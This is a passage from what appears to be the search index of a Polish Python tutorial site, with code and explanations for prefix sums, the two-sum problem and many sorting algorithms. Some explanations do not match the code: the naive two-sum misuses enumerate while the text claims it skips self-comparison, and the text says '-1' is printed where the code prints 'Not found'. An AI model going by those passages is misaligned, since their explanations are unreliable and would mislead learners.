warto\u015bci w li\u015bcie.</li> <li>Wy\u015bwietla te indeksy na ekranie.</li> </ol> <p>Podobnie jak poprzedni program, ten program jest efektywny, poniewa\u017c zamiast przechodzi\u0107 przez list\u0119 dwa razy (raz do znalezienia indeksu minimum, raz do znalezienia indeksu maksimum), robi to tylko raz, co jest szybsze dla du\u017cych list.</p>"},{"location":"programming/python/algorithms/searching/prefix-sum/","title":"Sumy prefiksowe","text":""},{"location":"programming/python/algorithms/searching/prefix-sum/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/searching/prefix-sum/#implementacja","title":"Implementacja","text":"<pre><code>def compute_prefix_sum(numbers_list: list) -&gt; list:\n  prefix_sum_list = [0]\n  for num in numbers_list:\n    prefix_sum_list.append(prefix_sum_list[-1] + num)\n\n  return prefix_sum_list\n\ndef answer_queries(numbers_list: list, queries_list: list):\n  prefix_sum_list = compute_prefix_sum(numbers_list)\n  for q_begin, q_end in queries_list:\n    result = prefix_sum_list[q_end + 1] - prefix_sum_list[q_begin]\n    print(f\"sum({q_begin}:{q_end}) = {result}\")\n\nnumbers_list = [8, 4, 1, 5, 8, 0, 12, 9, 26, 3]\nqueries_list = [(1, 5), (0, 3), (6, 9)]\n\nanswer_queries(numbers_list, queries_list)\n</code></pre>"},{"location":"programming/python/algorithms/searching/sum-of-two/","title":"Suma dw\u00f3ch liczb","text":""},{"location":"programming/python/algorithms/searching/sum-of-two/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/searching/sum-of-two/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<pre><code>def sum_of_two(tab: list, k: int):\n    for i, num1 in enumerate(tab):\n        for _, num2 in enumerate(tab, i + 1):\n            if num1 + num2 == k:\n                print(num1, num2)\n                return\n\n    print(\"Not found\")\n\ntab = [1, 2, 4, 6, 8, 9, 10, 12, 13, 15]\nk = 18\n\nsum_of_two(tab, k)\n</code></pre> <p>Funkcja <code>sum_of_two</code> przyjmuje jako argumenty list\u0119 <code>tab</code> (lista liczb) oraz liczb\u0119 ca\u0142kowit\u0105 <code>k</code> (szukana suma).</p> <p>Pocz\u0105tkowo mamy dwie zagnie\u017cd\u017cone p\u0119tle <code>for</code>. Pierwsza p\u0119tla iteruje przez wszystkie indeksy i elementy listy <code>tab</code>. Wewn\u0105trz pierwszej p\u0119tli mamy drug\u0105 p\u0119tl\u0119 <code>for</code>, kt\u00f3ra iteruje przez kolejne elementy od indeksu <code>i+1</code>. Dzi\u0119ki temu unikamy por\u00f3wnywania tej samej liczby ze sam\u0105 sob\u0105 oraz dublowania por\u00f3wna\u0144.</p> <p>W ka\u017cdej iteracji wewn\u0119trznej p\u0119tli sprawdzamy, czy suma dw\u00f3ch element\u00f3w tablicy (<code>num1</code> i <code>num2</code>) jest r\u00f3wna szukanej sumie <code>k</code>. Je\u015bli tak, wypisujemy te dwie liczby i ko\u0144czymy dzia\u0142anie funkcji za pomoc\u0105 operacji <code>return</code>.</p> <p>Je\u015bli nie znaleziono pary liczb o sumie <code>k</code> w ca\u0142ej li\u015bcie, wypisujemy \\(-1\\).</p> <p>W przyk\u0142adzie podane s\u0105 konkretne warto\u015bci dla <code>tab</code> i <code>k</code>. Funkcja <code>sum_of_two</code> jest wywo\u0142ywana z tymi warto\u015bciami.</p> <p>W wyniku wykonania tego kodu, zostan\u0105 wypisane liczby \\(6\\) i \\(12\\), poniewa\u017c ich suma wynosi \\(18\\).</p>"},{"location":"programming/python/algorithms/searching/sum-of-two/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<pre><code>def sum_of_two(tab: list, k: int):\n    left = 0\n    right = len(tab) - 1\n\n    while left &lt; right and tab[left] + tab[right] != k:\n        if tab[left] + tab[right] &lt; k:\n            left += 1\n        else:\n            right -= 1\n\n    if left &lt; right:\n        print(tab[left], tab[right])\n    else:\n        print(\"Not found\")\n\ntab = [1, 2, 4, 6, 8, 9, 10, 12, 13, 15]\nk = 18\n\nsum_of_two(tab, k)\n</code></pre> <p>Funkcja <code>sum_of_two</code> przyjmuje jako argumenty list\u0119 <code>tab</code> (lista liczb) oraz liczb\u0119 ca\u0142kowit\u0105 <code>k</code> (szukana suma).</p> <p>Ustalamy pocz\u0105tkowe warto\u015bci dla lewego wska\u017anika (<code>left</code>) na \\(0\\) i prawego wska\u017anika (<code>right</code>) na d\u0142ugo\u015b\u0107 listy minus 1.</p> <p>W p\u0119tli <code>while</code> sprawdzamy warunek: <code>left &lt; right</code> oraz <code>tab[left] + tab[right] != k</code>. W ka\u017cdej iteracji p\u0119tli sprawdzamy, czy suma <code>tab[left]</code> i <code>tab[right]</code> jest mniejsza od <code>k</code>. Je\u015bli tak, inkrementujemy lewy wska\u017anik (<code>left += 1</code>), aby przesun\u0105\u0107 si\u0119 w prawo i sprawdzi\u0107 wi\u0119ksze warto\u015bci. Je\u015bli suma jest wi\u0119ksza od <code>k</code>, dekrementujemy prawy wska\u017anik (<code>right -= 1</code>), aby przesun\u0105\u0107 si\u0119 w lewo i sprawdzi\u0107 mniejsze warto\u015bci.</p> <p>Po wyj\u015bciu z p\u0119tli, je\u015bli znaleziono par\u0119 liczb o sumie <code>k</code> (<code>left &lt; right</code>), wypisujemy te dwie liczby. Je\u015bli nie znaleziono takiej pary liczb w ca\u0142ej li\u015bcie, wypisujemy \\(-1\\).</p> <p>W przyk\u0142adzie podane s\u0105 konkretne warto\u015bci dla <code>tab</code> i <code>k</code>. Funkcja <code>sum_of_two</code> jest wywo\u0142ywana z tymi warto\u015bciami.</p> <p>W wyniku wykonania tego kodu, zostan\u0105 wypisane liczby \\(6\\) i \\(12\\), poniewa\u017c ich suma wynosi \\(18\\).</p>"},{"location":"programming/python/algorithms/sorting/bubble-sort/","title":"Sortowanie b\u0105belkowe","text":""},{"location":"programming/python/algorithms/sorting/bubble-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/bubble-sort/#implementacja","title":"Implementacja","text":"<pre><code>def bubble_sort(array: list):\n    sorted = False\n    i = 0\n    while not sorted:\n        sorted = True\n        for j in range(len(array) - 1, i, -1):\n            if array[j - 1] &gt; array[j]:\n                array[j], array[j - 1] = array[j-1], array[j]\n                sorted = False\n        i += 1\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nbubble_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/bubble-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>bubble_sort</code> przyjmuje jako argument list\u0119 <code>array</code>, kt\u00f3ra ma by\u0107 posortowana.</p> <p>Na pocz\u0105tku funkcji ustawiamy zmienn\u0105 <code>sorted</code> na <code>False</code>, co oznacza, \u017ce lista nie jest jeszcze posortowana. Ustawiamy tak\u017ce zmienn\u0105 <code>i</code> na \\(0\\), kt\u00f3ra b\u0119dzie reprezentowa\u0107 indeks granicy posortowanej cz\u0119\u015bci listy.</p> <p>Nast\u0119pnie rozpoczynamy p\u0119tl\u0119 <code>while</code>, kt\u00f3ra b\u0119dzie si\u0119 wykonywa\u0107, dop\u00f3ki lista nie zostanie posortowana. Wewn\u0105trz p\u0119tli ustawiamy zmienn\u0105 <code>sorted</code> na <code>True</code>, zak\u0142adaj\u0105c, \u017ce lista jest posortowana.</p> <p>Nast\u0119pnie mamy p\u0119tl\u0119 <code>for</code>, kt\u00f3ra iteruje w odwrotnej kolejno\u015bci od <code>len(array) - 1</code> do <code>i</code> (indeks granicy posortowanej cz\u0119\u015bci). Por\u00f3wnujemy elementy <code>array[j - 1]</code> i <code>array[j]</code> i <code>je\u015bli array[j - 1]</code> jest wi\u0119ksze od <code>array[j]</code>, zamieniamy je miejscami przy u\u017cyciu operacji <code>array[j], array[j - 1] = array[j-1], array[j]</code>. W ten spos\u00f3b wi\u0119ksze elementy s\u0105 przesuwane na koniec listy. Je\u015bli w trakcie iteracji wewn\u0119trznej p\u0119tli <code>for</code> nast\u0105pi\u0142a zamiana element\u00f3w, ustawiamy zmienn\u0105 <code>sorted</code> na <code>False</code>, co oznacza, \u017ce lista nie jest jeszcze posortowana. Po zako\u0144czeniu iteracji wewn\u0119trznej p\u0119tli <code>for</code>, najwi\u0119kszy element znajduje si\u0119 na ostatniej pozycji granicy posortowanej cz\u0119\u015bci.</p> <p>Po wyj\u015bciu z wewn\u0119trznej p\u0119tli <code>for</code> zwi\u0119kszamy warto\u015b\u0107 <code>i</code> o \\(1\\), aby przesun\u0105\u0107 granic\u0119 posortowanej cz\u0119\u015bci.</p> <p>Proces sortowania b\u0105belkowego jest powtarzany, a\u017c do momentu, gdy \u017cadna zamiana element\u00f3w nie jest ju\u017c potrzebna. Oznacza to, \u017ce lista jest ju\u017c posortowana. Po zako\u0144czeniu sortowania, posortowana lista jest przechowywana w zmiennej <code>array</code>.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy list\u0119 do posortowania, a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>bubble_sort</code>, jako parametr przekazuj\u0105c utworzon\u0105 list\u0119. Na ko\u0144cu wy\u015bwietlamy posortowan\u0105 list\u0119 za pomoc\u0105 funkcji <code>print</code>.</p>"},{"location":"programming/python/algorithms/sorting/cocktail-shaker-sort/","title":"Sortowanie koktajlowe","text":""},{"location":"programming/python/algorithms/sorting/cocktail-shaker-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/cocktail-shaker-sort/#implementacja","title":"Implementacja","text":"<pre><code>def cocktail_shaker_sort(array: list):\n    for i in range(len(array) // 2 + 1):\n        for j in range(i, len(array) - i - 1):\n            if array[j] &gt; array[j + 1]:\n                array[j], array[j + 1] = array[j + 1], array[j]\n\n        for j in range(len(array) - 1 - i, i, -1):\n            if array[j] &lt; array[j - 1]:\n                array[j], array[j - 1] = array[j - 1], array[j]\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\ncocktail_shaker_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/cocktail-shaker-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>cocktail_shaker_sort</code> przyjmuje jako argument list\u0119 <code>array</code>, kt\u00f3ra ma by\u0107 posortowana.</p> <p>W pierwszej p\u0119tli <code>for</code> iterujemy przez po\u0142ow\u0119 d\u0142ugo\u015bci listy <code>array</code> podzielonej przez 2 (dzielimy przez 2, poniewa\u017c w ka\u017cdej iteracji sortowania oba ko\u0144ce listy s\u0105 ju\u017c posortowane, wi\u0119c mo\u017cemy je pomija\u0107).</p> <p>Wewn\u0119trzna p\u0119tla <code>for</code> rozpoczyna si\u0119 od <code>i</code> i iteruje do <code>len(array) - i - 1</code>. Por\u00f3wnuje elementy <code>array[j]</code> i <code>array[j + 1]</code> i je\u015bli <code>array[j]</code> jest wi\u0119ksze od <code>array[j + 1]</code>, zamienia je miejscami przy u\u017cyciu operacji <code>array[j], array[j + 1] = array[j + 1], array[j]</code>. W ten spos\u00f3b wi\u0119ksze elementy s\u0105 przesuwane na koniec listy.</p> <p>Po zako\u0144czeniu pierwszej wewn\u0119trznej p\u0119tli, najwi\u0119kszy element znajduje si\u0119 na ostatniej pozycji listy.</p> <p>Nast\u0119pnie mamy drug\u0105 wewn\u0119trzn\u0105 p\u0119tl\u0119 <code>for</code>, kt\u00f3ra iteruje od <code>len(array) - 1 - i</code> (czyli od ostatniego elementu minus <code>i</code>) do <code>i</code>. W tej p\u0119tli por\u00f3wnujemy s\u0105siednie elementy <code>array[j]</code> i <code>array[j - 1]</code> i je\u015bli <code>array[j]</code> jest mniejsze od <code>array[j - 1]</code>, zamieniamy je miejscami.</p> <p>Po zako\u0144czeniu drugiej wewn\u0119trznej p\u0119tli, najmniejszy element znajduje si\u0119 na pierwszej pozycji listy.</p> <p>Po zako\u0144czeniu sortowania, posortowana lista jest przechowywana w zmiennej <code>array</code>.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy list\u0119 do posortowania, a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>cocktail_shaker_sort</code>, jako parametr przekazuj\u0105c utworzon\u0105 list\u0119. Na ko\u0144cu wy\u015bwietlamy posortowan\u0105 list\u0119 za pomoc\u0105 funkcji <code>print</code>.</p>"},{"location":"programming/python/algorithms/sorting/comb-sort/","title":"Sortowanie grzebieniowe","text":""},{"location":"programming/python/algorithms/sorting/comb-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/comb-sort/#implementacja","title":"Implementacja","text":"<pre><code>def comb_sort(array: list):\n    gap = len(array)\n    shrink = 1.3\n    sorted = False\n    while not sorted:\n        gap = int(gap / shrink)\n        if gap &lt;= 1:\n            gap = 1\n            sorted = True\n\n        i = 0\n        while i + gap &lt; len(array):\n            if array[i] &gt; array[i + gap]:\n                array[i], array[i + gap] = array[i + gap], array[i]\n                sorted = False\n\n            i += 1\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\ncomb_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/comb-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>comb_sort</code> przyjmuje jako argument list\u0119 <code>array</code>, kt\u00f3ra ma by\u0107 posortowana.</p> <p>Wewn\u0105trz funkcji ustalamy pocz\u0105tkow\u0105 warto\u015b\u0107 <code>gap</code> na rozmiar listy <code>array</code>. Ustalamy tak\u017ce warto\u015b\u0107 <code>shrink</code> na \\(1.3\\), co jest czynnikiem zmniejszaj\u0105cym odst\u0119p <code>gap</code> w ka\u017cdej iteracji. Jako ostatni\u0105 ustalamy zmienn\u0105 <code>sorted</code> na <code>False</code>, co oznacza, \u017ce lista nie jest jeszcze posortowana.</p> <p>Rozpoczynamy p\u0119tl\u0119 <code>while</code>, kt\u00f3ra b\u0119dzie si\u0119 wykonywa\u0107, dop\u00f3ki lista nie zostanie posortowana. Wewn\u0105trz p\u0119tli <code>while</code> obliczamy now\u0105 warto\u015b\u0107 <code>gap</code> przez podzielenie aktualnej warto\u015bci <code>gap</code> przez <code>shrink</code> i rzutujemy wynik na warto\u015b\u0107 ca\u0142kowit\u0105 (u\u017cywamy <code>int(gap / shrink)</code>). Je\u015bli <code>gap</code> jest mniejszy lub r\u00f3wny \\(1\\), ustawiamy gap na \\(1\\) i <code>sorted</code> na <code>True</code>, co oznacza, \u017ce lista jest ju\u017c posortowana. Nast\u0119pnie ustalamy zmienn\u0105 <code>i</code> na \\(0\\), kt\u00f3ra b\u0119dzie reprezentowa\u0107 indeks por\u00f3wnywanych element\u00f3w.</p> <p>Rozpoczynamy wewn\u0119trzn\u0105 p\u0119tl\u0119 <code>while</code>, kt\u00f3ra b\u0119dzie si\u0119 wykonywa\u0107, dop\u00f3ki <code>i + gap</code> jest mniejsze ni\u017c rozmiar listy <code>array</code>. Wewn\u0105trz wewn\u0119trznej p\u0119tli por\u00f3wnujemy elementy <code>array[i]</code> i <code>array[i + gap]</code>. Je\u015bli <code>array[i]</code> jest wi\u0119ksze od <code>array[i + gap]</code>, zamieniamy je miejscami przy u\u017cyciu operacji przypisania wielokrotnego <code>array[i], array[i + gap] = array[i + gap], array[i]</code>. Je\u015bli w trakcie iteracji wewn\u0119trznej p\u0119tli <code>while</code> nast\u0105pi\u0142a zamiana element\u00f3w, ustawiamy <code>sorted</code> na <code>False</code>, co oznacza, \u017ce lista nie jest jeszcze posortowana. Na ko\u0144cu wewn\u0119trznej p\u0119tli zwi\u0119kszamy warto\u015b\u0107 <code>i</code> o \\(1\\), aby przej\u015b\u0107 do kolejnych por\u00f3wna\u0144.</p> <p>Po zako\u0144czeniu wewn\u0119trznej p\u0119tli <code>while</code>, przechodzimy do nast\u0119pnej iteracji zewn\u0119trznej p\u0119tli <code>while</code>.</p> <p>Proces sortowania grzebieniowego jest powtarzany, a\u017c do momentu, gdy <code>gap</code> osi\u0105gnie warto\u015b\u0107 \\(1\\) i nie wyst\u0105pi\u0105 ju\u017c \u017cadne zamiany element\u00f3w. Oznacza to, \u017ce lista jest ju\u017c posortowana. Po zako\u0144czeniu sortowania, posortowana lista jest przechowywana w zmiennej <code>array</code>.</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu przygotowujemy list\u0119 do posortowania, a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>comb_sort</code>, jako parametr przekazuj\u0105c utworzon\u0105 list\u0119. Na ko\u0144cu wy\u015bwietlamy posortowan\u0105 list\u0119 za pomoc\u0105 funkcji <code>print</code>.</p>"},{"location":"programming/python/algorithms/sorting/counting-sort/","title":"Sortowanie przez zliczanie","text":""},{"location":"programming/python/algorithms/sorting/counting-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/counting-sort/#implementacja","title":"Implementacja","text":"<pre><code>def count_occurrences(array: list) -&gt; list:\n    max_number = max(array)\n    occurrences = [0] * (max_number + 1)\n\n    for number in array:\n        occurrences[number] += 1\n\n    return occurrences\n\ndef counting_sort(array: list):\n    occurrences = count_occurrences(array)\n\n    array.clear()\n\n    for i in range(len(occurrences)):\n        for j in range(occurrences[i]):\n            array.append(i)\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\ncounting_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/counting-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Zaczynamy od stworzenia funkcji <code>count_occurences</code> (linia 1) s\u0142u\u017c\u0105cej do zliczenia wyst\u0105pie\u0144 ka\u017cdej liczby od zera do maksymalnej warto\u015bci w li\u015bcie. Na pocz\u0105tku funkcji zaczynamy od znalezienia maksymalnej warto\u015bci w li\u015bcie (linia 2). Nast\u0119pnie tworzymy list\u0119 <code>occurrences</code> s\u0142u\u017c\u0105c\u0105 do zliczania liczby wyst\u0105pie\u0144 poszczeg\u00f3lnych warto\u015bci w li\u015bcie <code>array</code> (linia 3). Na pocz\u0105tku wype\u0142niamy j\u0105 zerami od pozycji 0 do pozycji wyznaczonej przez maksymalny element (zmienna <code>max_number</code>). Po utworzeniu listy licznik\u00f3w przechodzimy do zliczania. Dla ka\u017cdego elementu (zmienna <code>number</code>) w li\u015bcie <code>array</code>(linia 5) zwi\u0119kszamy przypisany do tego elementu licznik (linia 6). Na koniec funkcji zwracamy jej wynik w postaci listy licznik\u00f3w (linia 8).</p> <p>W nast\u0119pnej kolejno\u015bci tworzymy funkcj\u0119 <code>counting_sort</code> (linia 11) do sortowania przez zliczanie. Funkcja przyjmuje tylko jeden parametr: list\u0119 do posortowania. Na pocz\u0105tku funkcji zliczamy wyst\u0105pienia ka\u017cdej liczby na sortowanej li\u015bcie wywo\u0142uj\u0105c funkcj\u0119 <code>count_occurrences</code> (linia 12). Liczniki zapisujemy w zmiennej <code>occurrences</code>. Po zliczeniu wszystkich element\u00f3w, czy\u015bcimy sortowan\u0105 list\u0119 za pomoc\u0105 polecenia <code>clear()</code> (linia 14), by m\u00f3c j\u0105 wype\u0142ni\u0107 posortowanymi warto\u015bciami. Nast\u0119pnie przechodzimy przez wszystkie liczniki na li\u015bcie <code>occurrences</code> (linia 16) i dla ka\u017cdego licznika tyle razy ile wynosi jego warto\u015b\u0107 (linia 17) dodajemy odpowiedni\u0105 liczb\u0119 do sortowanej listy (linia 18).</p> <p>W kodzie g\u0142\u00f3wnym na pocz\u0105tku tworzymy list\u0119 do posortowania (linia 21), nast\u0119pnie sortujemy list\u0119 metod\u0105 sortowania przez zliczanie (linia 23), a na ko\u0144cu wypisujemy posortowan\u0105 list\u0119 na ekranie (linia 25).</p>"},{"location":"programming/python/algorithms/sorting/gnome-sort/","title":"Sortowanie gnoma","text":""},{"location":"programming/python/algorithms/sorting/gnome-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/gnome-sort/#implementacja","title":"Implementacja","text":"<pre><code>def gnome_sort(array: list):\n    i = 0\n    while i &lt; len(array):\n        if i == 0 or array[i] &gt;= array[i - 1]:\n            i += 1\n        else:\n            array[i], array[i - 1] = array[i - 1], array[i]\n            i -= 1\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\ngnome_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/gnome-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>gnome_sort</code> (linia 1) przyjmuje tylko jeden argument: list\u0119 element\u00f3w do posortowania. Wewn\u0105trz funkcji zaczynamy od stworzenia licznika zapami\u0119tuj\u0105cego obecn\u0105 pozycj\u0119 na li\u015bcie (linia 2). Nast\u0119pnie przechodzimy p\u0119tl\u0105 warunkow\u0105 dop\u00f3ki nie dotrzemy do ko\u0144ca listy (linia 3). Wewn\u0105trz p\u0119tli sprawdzamy, czy znajdujemy si\u0119 na pocz\u0105tkowej pozycji na li\u015bcie lub czy obecny element jest wi\u0119kszy b\u0105d\u017a r\u00f3wny od poprzedniego (linia 4). Je\u017celi tak jest, to przechodzimy do kolejnego elementu poprzez zwi\u0119kszenie licznika (linia 5). W przeciwnym przypadku (linia 6) zamieniamy obecny element na li\u015bcie z poprzednim (linia 7) i cofamy si\u0119 do poprzedniego elementu na li\u015bcie poprzez zmniejszenie licznika (linia 8).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej przygotowujemy list\u0119 element\u00f3w do posortowania (linia 11), nast\u0119pnie sortujemy list\u0119 (linia 13) i wypisujemy j\u0105 na ekranie (linia 15).</p>"},{"location":"programming/python/algorithms/sorting/heap-sort/","title":"Sortowanie przez kopcowanie","text":""},{"location":"programming/python/algorithms/sorting/heap-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/heap-sort/#implementacja","title":"Implementacja","text":"<pre><code>def build_heap(array: [], n: int):\n    for i in range(1, n):\n        parent_index = (i - 1) // 2\n        j = i\n\n        while j &gt; 0 and array[j] &gt; array[parent_index]:\n            array[j], array[parent_index] = array[parent_index], array[j]\n            j = parent_index\n            parent_index = (j - 1) // 2\n\ndef heap_sort(array: []):\n    for i in range(len(array) - 1, 0, -1):\n        build_heap(array, i + 1)\n        array[0], array[i] = array[i], array[0]\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nheap_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/insertion-sort/","title":"Sortowanie przez wstawianie","text":""},{"location":"programming/python/algorithms/sorting/insertion-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/insertion-sort/#implementacja","title":"Implementacja","text":"<pre><code>def insertion_sort(array: list):\n    for i in range(1, len(array)):\n        j = i\n\n        while j &gt; 0 and array[j] &lt; array[j - 1]:\n            array[j], array[j - 1] = array[j - 1], array[j]\n            j -= 1\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\ninsertion_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/merge-sort/","title":"Sortowanie przez scalanie","text":""},{"location":"programming/python/algorithms/sorting/merge-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/merge-sort/#implementacja","title":"Implementacja","text":"<pre><code>def merge(array: list, left: int, right: int, division: int):\n    merged_length = right - left\n    merged = []\n    index1 = left\n    index2 = division\n\n    for i in range(merged_length):\n        if index1 &gt;= division or (index2 &lt; right and array[index1] &gt; array[index2]):\n            merged.append(array[index2])\n            index2 += 1\n        elif index2 &gt;= right or array[index1] &lt;= array[index2]:\n            merged.append(array[index1])\n            index1 += 1\n\n    for i in range(merged_length):\n        array[left + i] = merged[i]\n\ndef merge_sort(array: list, left: int, right: int):\n    if right - left &lt;= 1:\n        return\n\n    division = (left + right) // 2\n\n    merge_sort(array, left, division)\n    merge_sort(array, division, right)\n\n    merge(array, left, right, division)\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nmerge_sort(array, 0, len(array))\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/odd-even-sort/","title":"Sortowanie odd-even","text":""},{"location":"programming/python/algorithms/sorting/odd-even-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/odd-even-sort/#implementacja","title":"Implementacja","text":"<pre><code>def odd_even_sort(array: list):\n    for i in range(len(array)):\n        for j in range(i % 2 + 1, len(array), 2):\n            if array[j] &lt; array[j - 1]:\n                array[j], array[j - 1] = array[j - 1], array[j]\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nodd_even_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/quick-sort/","title":"Sortowanie szybkie","text":""},{"location":"programming/python/algorithms/sorting/quick-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/quick-sort/#implementacja","title":"Implementacja","text":"<pre><code>def quick_sort(array: list, left: int, right: int):\n    if right &lt;= left:\n        return\n\n    pivot = array[(left + right) // 2]\n    i = left\n    j = right\n\n    while i &lt;= j:\n        while array[i] &lt; pivot:\n            i += 1\n\n        while array[j] &gt; pivot:\n            j -= 1\n\n        if i &gt; j:\n            break\n\n        array[i], array[j] = array[j], array[i]\n\n        i += 1\n        j -= 1\n\n    quick_sort(array, left, j)\n    quick_sort(array, i, right)\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nquick_sort(array, 0, len(array) - 1)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/quick-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>quick_sort</code> (linia 1) przyjmuje trzy parametry: list\u0119 do posortowania (<code>array</code>), pocz\u0105tek (<code>left</code>) oraz koniec (<code>right</code>) sortowanego fragmentu listy. Na pocz\u0105tku funkcji sprawdzamy warunek stopu rekurencji (linia 2). Gdy jest spe\u0142niony to ko\u0144czymy obecne wywo\u0142anie funkcji (linia 3). Gdy funkcja nie zosta\u0142a zako\u0144czona, to obliczamy warto\u015b\u0107 elementu pivot bior\u0105c \u015brodkow\u0105 warto\u015b\u0107 z sortowanego fragmentu listy (linia 5). Tworzymy tak\u017ce dwa liczniki do przechodzenia po li\u015bcie od lewej (linia 6) oraz prawej (linia 7) strony. Nast\u0119pnie wykonujemy dzia\u0142ania w p\u0119tli, dop\u00f3ki liczniki wyznaczaj\u0105 poprawny przedzia\u0142 (linia 9). Wewn\u0105trz p\u0119tli najpierw przechodzimy p\u0119tl\u0105 od lewej strony szukaj\u0105c pierwszego elementu wi\u0119kszego lub r\u00f3wnego warto\u015bci elementu pivot (linie 10 i 11). W kolejnej p\u0119tli robimy podobnie, przechodz\u0105c od prawej strony szukaj\u0105c pierwszego elementu mniejszego lub r\u00f3wnego warto\u015bci elementu pivot (linie 13 i 14). Nast\u0119pnie sprawdzamy, czy definiowany przez liczniki przedzia\u0142 jest b\u0142\u0119dny (linia 16). Je\u017celi tak, to wychodzimy z p\u0119tli (linia 17). Je\u017celi nie zako\u0144czyli\u015bmy dzia\u0142ania p\u0119tli, to zamieniamy miejscami dwa elementy listy wyznaczone przez liczniki (linia 19) oraz odpowiednio zwi\u0119kszamy pierwszy licznik (linia 21) oraz zmniejszamy drugi (linia 22). Po wyj\u015bciu z p\u0119tli wykonujemy dwa wywo\u0142ania rekurencyjne, odpowiednio dla lewego fragmentu listy (linia 24) oraz dla prawego fragmentu (linia 25).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej tworzymy list\u0119 element\u00f3w do posortowania (linia 28), sortujemy j\u0105 (linia 30) oraz wypisujemy na ekranie (linia 32).</p>"},{"location":"programming/python/algorithms/sorting/selection-sort/","title":"Sortowanie przez wybieranie","text":""},{"location":"programming/python/algorithms/sorting/selection-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/sorting/selection-sort/#implementacja","title":"Implementacja","text":"<pre><code>def find_min(array: list, begin: int) -&gt; int:\n    min_index = begin\n\n    for i in range(begin + 1, len(array)):\n        if array[i] &lt; array[min_index]:\n            min_index = i\n\n    return min_index\n\ndef selection_sort(array: list):\n    for i in range(len(array)):\n        min_index = find_min(array, i)\n        array[i], array[min_index] = array[min_index], array[i]\n\narray = [7, 3, 0, 1, 5, 2, 5, 19, 10, 5]\n\nselection_sort(array)\n\nprint(array)\n</code></pre>"},{"location":"programming/python/algorithms/sorting/selection-sort/#opis-implementacji","title":"Opis implementacji","text":"<p>Powy\u017csza implementacja sk\u0142ada si\u0119 z dw\u00f3ch funkcji: </p> <ul> <li>pomocniczej funkcji <code>find_min</code> znajduj\u0105cej indeks najmniejszej warto\u015bci na li\u015bcie, pocz\u0105wszy od podanej pozycji,</li> <li>g\u0142\u00f3wnej funkcji sortuj\u0105cej metod\u0105 sortowania przez wybieranie <code>selection_sort</code></li> </ul> <p>Funkcja <code>find_min</code> przyjmuje dwa argumenty: list\u0119 do przeszukania (zmienna <code>array</code>) oraz indeks elementu, od kt\u00f3rego powinni\u015bmy zacz\u0105\u0107 nasze poszukiwania (zmienna <code>begin</code>). Proces znajdowania indeksu warto\u015bci minimalnej wygl\u0105da standardowo: najpierw zak\u0142adamy, \u017ce warto\u015b\u0107 najmniejsza znajduje si\u0119 w pocz\u0105tkowej pozycji (linia 2), a nast\u0119pnie przechodzimy p\u0119tl\u0105 przez pozosta\u0142\u0105 cz\u0119\u015b\u0107 listy (linia 4). Gdy znajdziemy element o warto\u015bci mniejszej ni\u017c dotychczasowe minimum (linia 5) to zapisujemy jego indeks (linia 6). Po sprawdzeniu wszystkich element\u00f3w, zwracamy wynik - indeks najmniejszego elementu na li\u015bcie od wskazanej pozycji (linia 8).</p> 